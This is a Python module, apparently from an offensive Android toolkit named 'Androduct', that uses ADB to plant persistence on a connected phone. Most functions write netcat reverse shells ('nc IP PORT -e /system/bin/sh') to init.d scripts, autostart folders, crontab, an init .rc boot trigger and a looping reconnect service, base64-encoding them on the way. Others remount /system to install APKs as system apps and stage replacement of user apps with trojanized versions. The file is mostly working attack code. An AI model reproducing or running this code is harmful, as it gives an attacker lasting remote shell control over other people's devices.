#!/usr/bin/env python3
"""
Persistence Module for Androduct Framework
Implements various persistence mechanisms on Android devices
"""

import subprocess
import os
import base64
from pathlib import Path
from core.adb.device_manager import DeviceManager
from core.utils.logger import logger
from config import Colors, PAYLOADS_DIR
from core.utils import session_manager

dm = DeviceManager()


def persistence_menu():
    """Main persistence menu"""
    device = dm.get_current_device()
    if not device:
        logger.error("No device connected. Please connect a device first.")
        return

    while True:
        # show global menu header
        try:
            print(session_manager.get_menu_header())
        except Exception:
            pass
        print(f"""
{Colors.CYAN}Persistence Mechanisms{Colors.END}
{Colors.CYAN}====================={Colors.END}
[1] Boot Receiver Persistence
[2] Service-based Persistence  
[3] Autostart Script Injection
[4] App Replacement/Hijacking
[5] System App Installation
[6] Init.d Script Persistence (Root)
[7] Crontab Persistence (Root)
[8] Property Trigger Persistence (Root)
[9] Show Active Persistence
[10] Clean All Persistence
[0] Back to Main Menu
        """)

        choice = input(f"{Colors.CYAN}persistence{Colors.END} > ").strip()

        try:
            if choice == "1":
                setup_boot_receiver(device)
            elif choice == "2":
                setup_service_persistence(device)
            elif choice == "3":
                inject_autostart_script(device)
            elif choice == "4":
                setup_app_hijacking(device)
            elif choice == "5":
                install_system_app(device)
            elif choice == "6":
                setup_initd_persistence(device)
            elif choice == "7":
                setup_crontab_persistence(device)
            elif choice == "8":
                setup_property_trigger(device)
            elif choice == "9":
                show_active_persistence(device)
            elif choice == "10":
                clean_all_persistence(device)
            elif choice == "0":
                break
            else:
                logger.warning("Invalid option selected")
        except Exception as e:
            logger.error(f"Operation failed: {str(e)}")


def execute_adb_command(device, command, shell=True, root=False):
    """Execute ADB command and return output"""
    try:
        if shell:
            if root:
                cmd = ["adb", "-s", device, "shell", "su", "-c"] + [command]
            else:
                cmd = ["adb", "-s", device, "shell"] + command.split()
        else:
            cmd = ["adb", "-s", device] + command.split()

        logger.log_command(" ".join(cmd), device)
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=30)

        if result.returncode == 0:
            return result.stdout.strip()
        else:
            logger.error(f"Command failed: {result.stderr.strip()}")
            return None
    except subprocess.TimeoutExpired:
        logger.error("Command timed out")
        return None
    except Exception as e:
        logger.error(f"Command execution failed: {str(e)}")
        return None


def check_root_access(device):
    """Check if device has root access"""
    result = execute_adb_command(device, "whoami", shell=True, root=True)
    return result == "root" if result else False


def setup_boot_receiver(device):
    """Set up boot receiver for persistence"""
    logger.info("Setting up boot receiver persistence...")

    if not check_root_access(device):
        logger.error("Root access required for boot receiver persistence")
        return

    # Create malicious APK with boot receiver
    payload_name = input(
        "Enter payload name (default: SystemUpdate): ").strip() or "SystemUpdate"

    # Create basic boot receiver APK
    apk_template = create_boot_receiver_apk(payload_name)

    print(f"{Colors.YELLOW}Creating boot receiver APK...{Colors.END}")

    # Generate APK using msfvenom
    payload_file = PAYLOADS_DIR / f"{payload_name}.apk"

    try:
        # Create a simple boot receiver
        logger.info("Generating boot receiver payload...")

        # This would typically use msfvenom to generate the APK
        # For now, we'll create a template
        logger.warning("Manual APK creation required - template generated")

        # Install the APK as system app
        print(f"{Colors.GREEN}Installing as system application...{Colors.END}")
        remote_path = f"/system/app/{payload_name}/{payload_name}.apk"

        commands = [
            f"mount -o remount,rw /system",
            f"mkdir -p /system/app/{payload_name}",
            f"cp /data/local/tmp/{payload_name}.apk {remote_path}",
            f"chmod 644 {remote_path}",
            f"chown root:root {remote_path}",
            f"mount -o remount,ro /system"
        ]

        for cmd in commands:
            execute_adb_command(device, cmd, shell=True, root=True)

        logger.success("Boot receiver persistence installed")

    except Exception as e:
        logger.error(f"Failed to setup boot receiver: {str(e)}")


def setup_service_persistence(device):
    """Set up persistent background service"""
    logger.info("Setting up service-based persistence...")

    # Create persistent service script
    service_script = """#!/system/bin/sh
# Persistent service script
while true; do
    # Connect back to C2 server
    /system/bin/nc YOUR_IP YOUR_PORT -e /system/bin/sh &
    sleep 300  # Wait 5 minutes before reconnecting
done
"""

    lhost = input("Enter your IP address: ").strip()
    lport = input("Enter your port: ").strip()

    if not lhost or not lport:
        logger.error("IP and port required")
        return

    # Replace placeholders
    service_script = service_script.replace(
        "YOUR_IP", lhost).replace("YOUR_PORT", lport)

    # Create service file
    script_file = "/data/local/tmp/persistent_service.sh"

    try:
        # Write script to device
        encoded_script = base64.b64encode(service_script.encode()).decode()
        execute_adb_command(
            device, f"echo {encoded_script} | base64 -d > {script_file}")
        execute_adb_command(device, f"chmod +x {script_file}")

        # Start the service
        execute_adb_command(device, f"nohup {script_file} &", shell=True)

        logger.success("Persistent service started")
        print(
            f"Service script location: {Colors.GREEN}{script_file}{Colors.END}")

    except Exception as e:
        logger.error(f"Failed to setup service persistence: {str(e)}")


def inject_autostart_script(device):
    """Inject script into autostart locations"""
    logger.info("Injecting autostart script...")

    if not check_root_access(device):
        logger.error("Root access required for autostart injection")
        return

    # Common autostart locations
    autostart_locations = [
        "/system/etc/init.d/",
        "/system/addon.d/",
        "/system/etc/init/",
        "/vendor/etc/init/"
    ]

    payload = input("Enter script content or file path: ").strip()
    if not payload:
        # Default reverse shell payload
        payload = """#!/system/bin/sh
# Autostart persistence script
/system/bin/nc YOUR_IP YOUR_PORT -e /system/bin/sh &
"""
        lhost = input("Enter your IP address: ").strip()
        lport = input("Enter your port: ").strip()

        if lhost and lport:
            payload = payload.replace(
                "YOUR_IP", lhost).replace("YOUR_PORT", lport)

    script_name = input(
        "Enter script name (default: 99persistence): ").strip() or "99persistence"

    try:
        for location in autostart_locations:
            # Check if location exists
            if execute_adb_command(device, f"test -d {location} && echo exists", shell=True, root=True) == "exists":
                script_path = f"{location}{script_name}"

                # Write script
                encoded_payload = base64.b64encode(payload.encode()).decode()
                execute_adb_command(
                    device, f"echo {encoded_payload} | base64 -d > {script_path}", shell=True, root=True)
                execute_adb_command(
                    device, f"chmod 755 {script_path}", shell=True, root=True)

                logger.success(f"Script injected to: {script_path}")

    except Exception as e:
        logger.error(f"Failed to inject autostart script: {str(e)}")


def setup_app_hijacking(device):
    """Replace legitimate app with trojanized version"""
    logger.info("Setting up app replacement/hijacking...")

    # List installed apps
    packages = execute_adb_command(device, "pm list packages -3")
    if not packages:
        logger.error("Failed to get package list")
        return

    print(f"{Colors.YELLOW}Installed User Apps:{Colors.END}")
    app_list = []
    for i, line in enumerate(packages.split('\\n')[:10], 1):
        if line.strip():
            package_name = line.split('=')[-1].strip()
            app_list.append(package_name)
            print(f"  [{i}] {package_name}")

    try:
        choice = int(input("Select app to replace (number): ")) - 1
        if 0 <= choice < len(app_list):
            target_app = app_list[choice]

            print(f"Selected app: {Colors.YELLOW}{target_app}{Colors.END}")

            # Get app path
            app_path = execute_adb_command(device, f"pm path {target_app}")
            if app_path:
                apk_path = app_path.split(':')[-1].strip()
                print(f"App location: {Colors.GREEN}{apk_path}{Colors.END}")

                # Backup original app
                backup_path = f"/data/local/tmp/{target_app}_backup.apk"
                execute_adb_command(
                    device, f"cp {apk_path} {backup_path}", shell=True, root=True)
                logger.info(f"Original app backed up to: {backup_path}")

                # Here you would replace with trojanized version
                logger.warning(
                    "Manual trojanization required - use APK patcher module")

        else:
            logger.error("Invalid selection")

    except (ValueError, IndexError):
        logger.error("Invalid selection")


def install_system_app(device):
    """Install app as system application"""
    logger.info("Installing app as system application...")

    if not check_root_access(device):
        logger.error("Root access required for system app installation")
        return

    apk_path = input("Enter local APK path: ").strip()
    if not os.path.exists(apk_path):
        logger.error("APK file not found")
        return

    app_name = input("Enter app name (for system folder): ").strip()
    if not app_name:
        app_name = Path(apk_path).stem

    try:
        # Push APK to device
        temp_path = "/data/local/tmp/temp_system.apk"
        subprocess.run(["adb", "-s", device, "push",
                       apk_path, temp_path], check=True)

        # Install as system app
        system_path = f"/system/app/{app_name}"
        apk_final_path = f"{system_path}/{app_name}.apk"

        commands = [
            "mount -o remount,rw /system",
            f"mkdir -p {system_path}",
            f"cp {temp_path} {apk_final_path}",
            f"chmod 644 {apk_final_path}",
            f"chown root:root {apk_final_path}",
            "mount -o remount,ro /system",
            f"rm {temp_path}"
        ]

        for cmd in commands:
            execute_adb_command(device, cmd, shell=True, root=True)

        logger.success(f"App installed as system app: {apk_final_path}")

    except Exception as e:
        logger.error(f"Failed to install system app: {str(e)}")


def setup_initd_persistence(device):
    """Set up init.d persistence (requires root)"""
    logger.info("Setting up init.d persistence...")

    if not check_root_access(device):
        logger.error("Root access required for init.d persistence")
        return

    # Check if init.d exists
    if not execute_adb_command(device, "test -d /system/etc/init.d && echo exists", shell=True, root=True) == "exists":
        logger.error("init.d not supported on this device")
        return

    script_content = """#!/system/bin/sh
# Init.d persistence script
/system/bin/nc YOUR_IP YOUR_PORT -e /system/bin/sh &
"""

    lhost = input("Enter your IP address: ").strip()
    lport = input("Enter your port: ").strip()

    if lhost and lport:
        script_content = script_content.replace(
            "YOUR_IP", lhost).replace("YOUR_PORT", lport)

        script_path = "/system/etc/init.d/99androduct"

        try:
            # Write script
            encoded_script = base64.b64encode(script_content.encode()).decode()
            execute_adb_command(
                device, f"echo {encoded_script} | base64 -d > {script_path}", shell=True, root=True)
            execute_adb_command(
                device, f"chmod 755 {script_path}", shell=True, root=True)

            logger.success(f"Init.d script installed: {script_path}")

        except Exception as e:
            logger.error(f"Failed to setup init.d persistence: {str(e)}")
    else:
        logger.error("IP and port required")


def setup_crontab_persistence(device):
    """Set up crontab persistence (requires root)"""
    logger.info("Setting up crontab persistence...")

    if not check_root_access(device):
        logger.error("Root access required for crontab persistence")
        return

    # Check if cron exists
    if not execute_adb_command(device, "which crontab", shell=True):
        logger.error("Crontab not available on this device")
        return

    cron_entry = "*/5 * * * * /system/bin/nc YOUR_IP YOUR_PORT -e /system/bin/sh"

    lhost = input("Enter your IP address: ").strip()
    lport = input("Enter your port: ").strip()

    if lhost and lport:
        cron_entry = cron_entry.replace(
            "YOUR_IP", lhost).replace("YOUR_PORT", lport)

        try:
            # Add cron entry
            execute_adb_command(
                device, f"echo '{cron_entry}' | crontab", shell=True, root=True)
            logger.success("Crontab entry added")

        except Exception as e:
            logger.error(f"Failed to setup crontab persistence: {str(e)}")
    else:
        logger.error("IP and port required")


def setup_property_trigger(device):
    """Set up property trigger persistence (requires root)"""
    logger.info("Setting up property trigger persistence...")

    if not check_root_access(device):
        logger.error("Root access required for property trigger persistence")
        return

    # Create property trigger script
    trigger_script = """
service androduct_persist /system/bin/sh /data/local/tmp/persist.sh
    class main
    user root
    group root
    oneshot
    disabled

on property:sys.boot_completed=1
    start androduct_persist
"""

    payload_script = """#!/system/bin/sh
/system/bin/nc YOUR_IP YOUR_PORT -e /system/bin/sh &
"""

    lhost = input("Enter your IP address: ").strip()
    lport = input("Enter your port: ").strip()

    if lhost and lport:
        payload_script = payload_script.replace(
            "YOUR_IP", lhost).replace("YOUR_PORT", lport)

        try:
            # Write payload script
            execute_adb_command(
                device, f"echo '{payload_script}' > /data/local/tmp/persist.sh", shell=True, root=True)
            execute_adb_command(
                device, "chmod +x /data/local/tmp/persist.sh", shell=True, root=True)

            # Write init script
            execute_adb_command(
                device, f"echo '{trigger_script}' >> /system/etc/init/androduct.rc", shell=True, root=True)

            logger.success("Property trigger persistence installed")

        except Exception as e:
            logger.error(f"Failed to setup property trigger: {str(e)}")
    else:
        logger.error("IP and port required")


def show_active_persistence(device):
    """Show active persistence mechanisms"""
    logger.info("Scanning for active persistence mechanisms...")

    print(f"{Colors.YELLOW}Active Persistence Mechanisms:{Colors.END}")

    # Check init.d scripts
    initd_scripts = execute_adb_command(
        device, "ls /system/etc/init.d/ 2>/dev/null", shell=True, root=True)
    if initd_scripts:
        print(
            f"  Init.d scripts: {Colors.GREEN}{len(initd_scripts.split())}{Colors.END}")

    # Check crontab
    cron_entries = execute_adb_command(
        device, "crontab -l 2>/dev/null", shell=True, root=True)
    if cron_entries:
        print(
            f"  Cron entries: {Colors.GREEN}{len(cron_entries.split('\\n'))}{Colors.END}")

    # Check autostart locations
    autostart_count = 0
    for location in ["/system/etc/init.d/", "/system/addon.d/", "/vendor/etc/init/"]:
        files = execute_adb_command(
            device, f"ls {location}*androduct* 2>/dev/null", shell=True, root=True)
        if files:
            autostart_count += len(files.split())

    print(f"  Autostart scripts: {Colors.GREEN}{autostart_count}{Colors.END}")

    # Check running services
    processes = execute_adb_command(
        device, "ps | grep -E 'nc|persist|backdoor'", shell=True)
    if processes:
        print(
            f"  Suspicious processes: {Colors.YELLOW}{len(processes.split('\\n'))}{Colors.END}")


def clean_all_persistence(device):
    """Remove all persistence mechanisms"""
    logger.warning("Cleaning all persistence mechanisms...")

    if not check_root_access(device):
        logger.error("Root access required for cleanup")
        return

    confirm = input(
        f"{Colors.RED}This will remove ALL persistence mechanisms. Continue? (y/N): {Colors.END}")
    if confirm.lower() != 'y':
        logger.info("Cleanup cancelled")
        return

    try:
        # Remove init.d scripts
        execute_adb_command(
            device, "rm /system/etc/init.d/*androduct* 2>/dev/null", shell=True, root=True)

        # Clear crontab
        execute_adb_command(device, "crontab -r 2>/dev/null",
                            shell=True, root=True)

        # Remove autostart scripts
        locations = ["/system/etc/init.d/",
                     "/system/addon.d/", "/vendor/etc/init/"]
        for location in locations:
            execute_adb_command(
                device, f"rm {location}*persist* 2>/dev/null", shell=True, root=True)

        # Kill suspicious processes
        execute_adb_command(
            device, "pkill -f 'nc|persist|backdoor'", shell=True, root=True)

        # Remove temp files
        execute_adb_command(
            device, "rm /data/local/tmp/persist* 2>/dev/null", shell=True, root=True)

        logger.success("Persistence cleanup completed")

    except Exception as e:
        logger.error(f"Cleanup failed: {str(e)}")


def create_boot_receiver_apk(payload_name):
    """Create template for boot receiver APK"""
    template = f"""
Android Boot Receiver Template for {payload_name}

Required components:
1. AndroidManifest.xml with BOOT_COMPLETED permission
2. BroadcastReceiver class to handle boot events  
3. Service class for persistent execution
4. Payload execution logic

Use APK development tools or msfvenom to generate actual APK.
    """

    template_file = PAYLOADS_DIR / f"{payload_name}_template.txt"
    with open(template_file, 'w') as f:
        f.write(template)

    logger.info(f"Boot receiver template created: {template_file}")
    return template_file


if __name__ == "__main__":
    persistence_menu()
